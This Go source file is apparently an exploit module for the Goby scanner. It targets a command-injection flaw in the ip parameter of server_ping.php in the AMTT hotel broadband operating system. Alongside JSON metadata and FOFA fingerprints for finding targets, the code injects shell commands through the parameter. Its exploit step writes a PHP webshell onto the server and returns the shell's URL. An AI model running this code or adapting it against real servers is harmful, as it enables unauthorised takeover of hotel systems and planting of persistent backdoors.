package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
)

func init() {
	expJson := `{
    "Name": "The command execution vulnerability of the ip parameter in the source/manager/radius/server_ping.php file of AMTT Digital Hotel Broadband Operation System",
    "Description": "<p>In 2006, Anmei Digital officially launched the relevant business and business model of China hotel smart room investment and operation. With its strong R&amp;D strength, advanced technology advantages, efficient and integrated elite team, and profound industry accumulation, it quickly occupied the intelligent service market in the hotel industry. licensed suppliers.</p><p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Amei-Hotel-Broadband-OS",
    "Homepage": "http://www.amttgroup.com/",
    "DisclosureDate": "2016-03-11",
    "PostTime": "2023-07-25",
    "Author": "m11711237@gmail.com",
    "FofaQuery": "(body=\"安美数字\" && body=\"amtt_logo.gif\" && title=\"宽带\" && title=\"酒店\")",
    "GobyQuery": "(body=\"安美数字\" && body=\"amtt_logo.gif\" && title=\"宽带\" && title=\"酒店\")",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.example.com\">http://www.amttgroup.com/</a></p>",
    "References": [
        "http://www.secevery.com:4321/bugs/wooyun-2016-0181444",
        "https://wooyun.laolisafe.com/bug_detail.php?wybug_id=wooyun-2016-0181444"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "安美数字酒店宽带运营系统 source/manager/radius/server_ping.php 文件 ip 参数命令执行漏洞",
            "Product": "安美数字-酒店宽带运营系统",
            "Description": "<p>安美数字于2006年正式推出了中国酒店智慧客房投资运营的相关业务和商业模式,凭借雄厚的研发实力、超前的技术优势、高效整合的精英团队以及深厚的行业积淀,快速地占领了酒店行业智能化服务市场;同时依托自主创新的InnFor Anymode核心技术,创建了全高清酒店客房互动信息服务运营平台,并迅速成为了多家国际著名跨国酒店管理集团宽带、Wi-Fi网络管理服务运营、客房互动电视系统、智能客房控制等产品的特许供应商。<br></p><p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.example.com\" target=\"_blank\">http://www.amttgroup.com/</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "The command execution vulnerability of the ip parameter in the source/manager/radius/server_ping.php file of AMTT Digital Hotel Broadband Operation System",
            "Product": "Amei-Hotel-Broadband-OS",
            "Description": "<p>In 2006, Anmei Digital officially launched the relevant business and business model of China hotel smart room investment and operation. With its strong R&amp;D strength, advanced technology advantages, efficient and integrated elite team, and profound industry accumulation, it quickly occupied the intelligent service market in the hotel industry. licensed suppliers.</p><p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.example.com\" target=\"_blank\">http://www.amttgroup.com/</a></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9925"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomFilename := goutils.RandomHexString(8)
			vulUri := "/manager/radius/server_ping.php?ip=127.0.0.1|touch%20" + randomFilename + ".txt&id=1"
			httpclient.SimpleGet(u.FixedHostInfo + vulUri)

			if resp, err := httpclient.SimpleGet(u.FixedHostInfo + "/manager/radius/" + randomFilename + ".txt"); err == nil {
				return resp.StatusCode == 200
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			randomFilename := goutils.RandomHexString(8)
			cmd := "echo '<?php @system($_GET[cmd]); ?>' > " + randomFilename + ".php"
			cmd = url.PathEscape(cmd)
			vulUri := "/manager/radius/server_ping.php?ip=127.0.0.1|" + cmd + "&id=1"
			httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + vulUri)

			if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + "/manager/radius/" + randomFilename + ".php"); err == nil && resp.StatusCode == 200 {
				expResult.Success = true
				expResult.Output = "Webshell: " + expResult.HostInfo.FixedHostInfo + "/manager/radius/" + randomFilename + ".php?cmd=whoami"
			}
			return expResult
		},
	))
}